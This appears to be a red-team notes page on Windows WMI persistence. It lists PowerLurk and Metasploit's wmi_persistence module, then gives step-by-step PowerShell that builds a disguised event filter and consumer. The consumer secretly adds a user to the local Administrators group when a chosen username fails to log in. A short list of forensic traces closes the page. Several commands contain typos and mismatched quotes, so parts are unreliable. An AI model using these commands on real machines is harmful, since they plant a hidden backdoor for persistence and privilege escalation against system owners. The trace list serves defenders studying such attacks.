# WMI Persist With Event Filters

### Automation

* There are many great automated ways to do this.
* [https://github.com/Sw4mpf0x/PowerLurk](https://github.com/Sw4mpf0x/PowerLurk)
* Metasploit post module `exploit/windows/local/wmi_persistence`

```
Basic options:
  Name                Current Setting  Required  Description
  ----                ---------------  --------  -----------
  CALLBACK_INTERVAL   1800000          yes       Time between callbacks (In milliseconds). (Default: 1800000).
  CLASSNAME           UPDATER          yes       WMI event class name. (Default: UPDATER)
  EVENT_ID_TRIGGER    4625             yes       Event ID to trigger the payload. (Default: 4625)
  PERSISTENCE_METHOD  EVENT            yes       Method to trigger the payload. (Accepted: EVENT, INTERVAL, LOGON, PROCESS, WAITFOR)
  PROCESS_TRIGGER     CALC.EXE         yes       The process name to trigger the payload. (Default: CALC.EXE)
  SESSION                              yes       The session to run this module on.
  USERNAME_TRIGGER    BOB              yes       The username to trigger the payload. (Default: BOB)
  WAITFOR_TRIGGER     CALL             yes       The word to trigger the payload. (Default: CALL)

```

### Manual Mode&#x20;

* Check if WMI is enabled, if it is not any `WMI` command that you execute will attempt to download `WMI`
* This download process does log in the `WMI Log`
* Check if WMI is enabled on the remote system&#x20;

```
reg query "HKLM\System\CurrentControlSet\Services\Winmgt"
Start        REG_DWORD        0x2

0x2 --> Auto Start
0x3 --> Demand Start
0x4 --> Disabled

#OR
get-service Winmgmt
```

*   &#x20;

    <figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

#### Check for existing entries&#x20;

* Check for existing event filter consumer bindings that are on the system&#x20;

```
Get-Wmiobject -Class __FilterToConsumerBinding -NameSpace "root\Subscription"
```

#### Ensure the system is logging event logs for the type of event you want to use

* #### - i.e. logon, logoff event&#x20;

```
auditpol /get /category:*
#OR for logon logoff 
auditpol /get /category:Logon/Logoff

--output--
System audit policy
Category/Subcategory                      Setting
Logon/Logoff
  Logon                                   Success and Failure
  Logoff                                  Success
  Account Lockout                         Success
  IPsec Main Mode                         No Auditing
  IPsec Quick Mode                        No Auditing
  IPsec Extended Mode                     No Auditing
  Special Logon                           Success
  Other Logon/Logoff Events               No Auditing
  Network Policy Server                   Success and Failure
  User / Device Claims                    No Auditing
  Group Membership                        No Auditing
```

#### Create your own filter and consumer&#x20;

```
$x='SCM System Log Filter'
$z='SCM System Log Consumer'
```

#### Now create the triggering event&#x20;

```
$q='Select * from __InstanceCreationEvent WITHIN 10 where TargetInstance isa 'Win32-NtLogEvent' and TargetInstance.logfile='Security' and (TargetInstance.EventCode='4625')"
```

#### Now create your event filter&#x20;

```
$wmifilter=Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$x;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$q} ErrorAction Stop
```

#### Create the event consumer&#x20;

```
$wmiconsumer=Set-WmiInstance -Class CommandLineEventConsumer -NameSpace "root\subscription" -Arguments @{Name=$z;CommandLineTemplate='C:\\Windows\\System32\\windowspowershell\\v.1.0\\powershell.exe -v 2.0 -nop -c "if(wevtutil qe security /rd:true /f:text /c:1 `"*[System/EventID=4625]`" | findstr /i "fake username here"){net localgroup Administrators <localuser> /add}"'}
```

#### Combine the filter and the comsumer&#x20;

```
Set-WmiInstance -Class __FilterToConsumerBinding -NameSpace "root\subscription" -Arguments @{Filter=$wmifilter;Consumer=$wmiconsumer}
```

#### Ensure Its all working and correct&#x20;

```
Get-WmiObject -Class __FilterToConsumerBinding -NameSpace "root\subscription"
```

### IOCs Left Behind&#x20;

```
C:\Windows\System32\Wbem\Repository\INDEX.BTR
- Cotnains the names of event filter and event consumer 
C:\Windows\System32\Wbem\Repository\OBJECTS.DATA
- Contains the names of event filter and event comsumer 
- Contains the command in the event consumer 
C:\Windows\System32\Wbem\Repository\MAPPING2.MAP
- Prefetch Files
"HKLM\Software\Microsoft\Wbem\Ess\//./root\CIMV2\MS_NT_EVENT_LOG_EVENT_PROVIDER"
```

#### Other Logs&#x20;

```
5857 Active ScriptEventConsumer provider started with result code 0x0
```
